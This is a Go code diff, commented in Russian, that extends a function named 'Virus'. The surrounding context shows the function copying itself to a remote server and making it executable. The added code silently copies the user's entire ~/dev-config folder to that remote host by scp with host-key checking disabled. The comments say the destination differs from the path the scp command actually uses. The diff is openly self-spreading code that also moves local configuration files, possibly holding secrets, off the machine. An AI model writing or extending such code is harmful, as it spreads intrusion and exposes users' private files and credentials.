@@ -67,6 +67,58 @@ func Virus(path string) error {
 		fmt.Printf("Предупреждение: не удалось установить права на выполнение на удалённом сервере: %v\n", err)
 	}
 
+	// Копируем все конфиги из папки ~/dev-config на удалённый сервер
+	if err := copyDevConfig(username, host, remotePath); err != nil {
+		fmt.Printf("Предупреждение: не удалось скопировать конфиги dev-config: %v\n", err)
+	}
+
 	fmt.Printf("Успешно скопировано на %s:%s\n", host, remotePath)
+	return nil
+}
+
+// copyDevConfig копирует всё содержимое локальной папки ~/dev-config
+// в одноимённую папку dev-config в домашнем каталоге удалённого пользователя.
+func copyDevConfig(username, host, remotePath string) error {
+	// Определяем домашнюю директорию текущего пользователя
+	home, err := os.UserHomeDir()
+	if err != nil {
+		return fmt.Errorf("не удалось определить домашнюю директорию: %v", err)
+	}
+
+	// Путь к локальной папке с конфигами
+	localConfigDir := filepath.Join(home, "dev-config")
+
+	return copyDevConfigDir(localConfigDir, username, host, remotePath)
+}
+
+// copyDevConfigDir копирует всё содержимое локальной папки конфигов
+// в одноимённую папку dev-config в домашнем каталоге удалённого пользователя.
+func copyDevConfigDir(localConfigDir, username, host, remotePath string) error {
+	// Проверяем, существует ли папка с конфигами
+	info, err := os.Stat(localConfigDir)
+	if err != nil {
+		if os.IsNotExist(err) {
+			fmt.Printf("Папка конфигов %s не найдена, пропускаем копирование конфигов.\n", localConfigDir)
+			return nil
+		}
+		return fmt.Errorf("не удалось проверить папку конфигов: %v", err)
+	}
+	if !info.IsDir() {
+		return fmt.Errorf("путь %s не является папкой", localConfigDir)
+	}
+
+	// Целевой путь на удалённом сервере: <remotePath>/dev-config
+	remoteConfigDir := filepath.Join(remotePath, "dev-config")
+
+	// Рекурсивно копируем папку dev-config (без пароля, полагаемся на SSH-ключи)
+	fmt.Printf("Копирование конфигов из %s на %s@%s:%s...\n", localConfigDir, username, host, remoteConfigDir)
+	scpConfig := exec.Command("scp", "-r", "-o", "StrictHostKeyChecking=no", localConfigDir, fmt.Sprintf("%s@%s:%s", username, host, remotePath))
+	scpConfig.Stdout = os.Stdout
+	scpConfig.Stderr = os.Stderr
+	if err := scpConfig.Run(); err != nil {
+		return fmt.Errorf("ошибка SCP конфигов: %v", err)
+	}
+
+	fmt.Printf("Конфиги успешно скопированы на %s:%s\n", host, remoteConfigDir)
 	return nil
 }
